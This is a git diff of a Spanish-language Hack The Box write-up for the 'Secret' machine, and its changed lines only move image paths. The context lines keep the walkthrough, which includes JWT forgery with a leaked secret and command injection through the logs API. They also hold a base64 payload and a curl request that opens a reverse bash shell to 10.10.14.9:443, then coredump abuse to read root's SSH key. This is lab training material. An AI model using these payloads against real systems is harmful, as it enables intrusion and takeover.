@@ -1,6 +1,6 @@
 
 
-![](2022-06-29-12-59-40.png)
+![](assets/2022-06-29-12-59-40.png)
 
 ## Máquina SECRET HTB
 
@@ -12,7 +12,7 @@
 
 ### Comprobamos que estamos conectados a la máquina de hack the box
 
-![](2022-06-28-19-26-29.png)
+![](assets/2022-06-28-19-26-29.png)
 
 Se trata de una máquina linux . Las máquinas linux sulen estar en 64 y las windows en 128
 
@@ -121,7 +121,7 @@ Posiblemente luego hagamos un fuzzing si no vemos nada.
 
 Explorando la web veo que se puede descargar uno el código por lo que nos lo descargamos con wget
 
-![](2022-06-28-21-56-08.png)
+![](assets/2022-06-28-21-56-08.png)
 
 >Entiendo que el motivo por el que se considera una web fácil en principio es que desde el login y register te viene casi un manual, voy a investigar esto antes que el código.
 
@@ -140,7 +140,7 @@ Capturamos con burpsuite /api/user/register
 
 Cambiamos la petición a PoST y ponemos localhost y enviamos, aparece que nos falta name
 
-![](2022-06-28-19-59-55.png)
+![](assets/2022-06-28-19-59-55.png)
 
 Nos pone un ejemplo que luego intentaremos loguearnos porque seguramente este funcionará
 
@@ -195,7 +195,7 @@ curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5c
 
 Lo ideal sería poder loguearnos como el administrador o cambiar el rol de pepito pero nos falta la clave secreta... Aún así es posible que pudiésemos piratearlo con el confusing o algo parecido podríamos probar con dos usuarios y su token.
 
-![](2022-06-28-21-50-05.png)
+![](assets/2022-06-28-21-50-05.png)
 
 Vimos que el administrador es 
 ```json
@@ -240,24 +240,24 @@ DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
 ```
 Voy a probar en jwt.io con este secreto cambiarme el nombre. No se si es alguno de los dos voy a ver
 
-![](2022-06-28-22-49-34.png)
+![](assets/2022-06-28-22-49-34.png)
 
 Ahora sustituimos por los valores funciona poniendo el secreto que eliminaron , el primer token
 
-![](2022-06-28-22-53-13.png)
+![](assets/2022-06-28-22-53-13.png)
 
 Ahora lo enviamos y vemos si funciona.
 
-![](2022-06-28-22-53-48.png)
+![](assets/2022-06-28-22-53-48.png)
 
 Ya somos admin pero solo nos está devolviendo un token con nuestros datos, nada más. De momento no podemos hacer nada, voy a mirar el código por encima del proyecto
 
 
-![](2022-06-28-22-56-16.png)
+![](assets/2022-06-28-22-56-16.png)
 
 Voy a ver que pasa si envío log con un parámetro
 
-![](2022-06-28-23-00-02.png)
+![](assets/2022-06-28-23-00-02.png)
 
 La idea es que dentro de esta línea ver si ejecuta algo. Tendríamos que cerrar el log git con un ; y llamar a lo que queremos.
 ```bash
@@ -266,7 +266,7 @@ La idea es que dentro de esta línea ver si ejecuta algo. Tendríamos que cerrar
 
 Siempre con el token que obtuvimos antes , cambiamos la url GET http://localhost:3000/api/logs?file=;ping+-c+1+127.0.0.1 
 
-![](2022-06-28-23-08-00.png)
+![](assets/2022-06-28-23-08-00.png)
 
 Vemos que efectivamente conseguimos que nos haga un ping
 
@@ -282,7 +282,7 @@ you should encode this as %2b.
 
 ;YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYxJwo=
 ```
-![](2022-06-28-23-20-28.png)
+![](assets/2022-06-28-23-20-28.png)
 
 Hemos visto que funciona, vamos a hacer la misma petición desde curl escuchando por icmp
 Con sudo tcpdump -ni tun0 icmp parece que vemos desde la propia consola que lanzamos el curl.
@@ -293,7 +293,7 @@ sudo tcpdump -ni tun0 icmp
 
 curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.9' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJf[spoiler]]yNjczfQ.g933JnjdcSRXs2AbDjrkUOsgDjPMjQDL3-MMvMTVMCs" | jq -r 
 
-![](2022-06-29-09-02-52.png)
+![](assets/2022-06-29-09-02-52.png)
 
 
 Hacemos una pequeña comprobación con /dev/null;id que sabemos que debe de funcionar.
@@ -301,7 +301,7 @@ Hacemos una pequeña comprobación con /dev/null;id que sabemos que debe de func
 curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode 'file=/dev/null;id' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2[spoiler]]NjU2NDQyNjczfQ.g933JnjdcSRXs2AbDjrkUOsgDjPMjQDL3-MMvMTVMCs" | jq -r
 ```
 
-![](2022-06-29-09-10-30.png)
+![](assets/2022-06-29-09-10-30.png)
 
 Una vez que vemos que funciona vamos a probar por netcat para poder interactuar. 
 
@@ -310,7 +310,7 @@ Una vez que vemos que funciona vamos a probar por netcat para poder interactuar.
 
 curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ey[spoiler]]iwiaWF0IjoxNjU2NDQyNjczfQ.g933JnjdcSRXs2AbDjrkUOsgDjPMjQDL3-MMvMTVMCs" | jq -r
 ```
-![](2022-06-29-09-18-32.png)
+![](assets/2022-06-29-09-18-32.png)
 
 Ahora que tenemos la bash creo, voy a arreglarla
 
@@ -342,7 +342,7 @@ stty size
 stty rows 61 columns 236
 
 ```
-![](2022-06-29-13-03-34.png)
+![](assets/2022-06-29-13-03-34.png)
 
 Entramos en la home de dasith y vemos la flag 
 
@@ -377,7 +377,7 @@ Vamos a ver los puertos abiertos de otra forma con cat/proc/net/tcp
 
 Como tenemos la kitty podemos seleccionar la columand e los puertos control+alt y seleccionar los campos
 
-![](2022-06-29-09-47-41.png)
+![](assets/2022-06-29-09-47-41.png)
 
 
 Y ahora vamos a usar un script que tengo creado para mostrar este tipo de puertos
@@ -408,7 +408,7 @@ Vamos a ver /opt
 cd /opt
 ls -l
 ```
-![](2022-06-29-09-56-19.png)
+![](assets/2022-06-29-09-56-19.png)
 
 Vale , vemos que todo es propiedad de root pero podemos leer code.c y valgrind.log y además ejecutar el tal count. Voy a ver que tienen.
 
@@ -479,7 +479,7 @@ Examinando el code.c que entiendo que es el código de count, vemos algunas cosi
 
 Hacemos justo cuando llegue un control+z para dejar en segundo plano y ver los procesos con ps -s | grep count
 
-![](2022-06-29-10-56-05.png)
+![](assets/2022-06-29-10-56-05.png)
 
 Vamos a probar ahora para ver los pid con 
 ```bash
@@ -530,7 +530,7 @@ mesg n 2> /dev/null || true
 
 Vemos que ejecuta algo pero... .viminfo también se podía leer así que vamos a probar ahora con ese
 
-![](2022-06-29-11-13-33.png)
+![](assets/2022-06-29-11-13-33.png)
 
 Estupendo , haciendole un head he visto utf8 por lo que puede que haya algo dentro y ahora lo que veo es una clave ssh o varias...
 
@@ -569,7 +569,7 @@ Load key "/home/dasith/id_rsa.pub": bad permissions
 ```
 Hay que buscar una forma de cerrar el proceso. Mirando el code.c aparece un comentario  **// Enable coredump generation**. Esa es una buena pista para intentar generar un bloqueo del proceso. Cuando un programa se bloquea, el sistema almacena los archivos de volcado de bloqueo en **/var/crash**
 
-![](2022-06-29-11-35-19.png)
+![](assets/2022-06-29-11-35-19.png)
 
 Voy a mirar pero no aparece nada. Voy a intentar abrir el archivo id_rsa con count 
 
@@ -619,4 +619,4 @@ Nos conectamos por ssh
 ssh root@10.10.11.120 -i id_rsa
 ```
 
-![](2022-06-29-12-56-51.png)
+![](assets/2022-06-29-12-56-51.png)
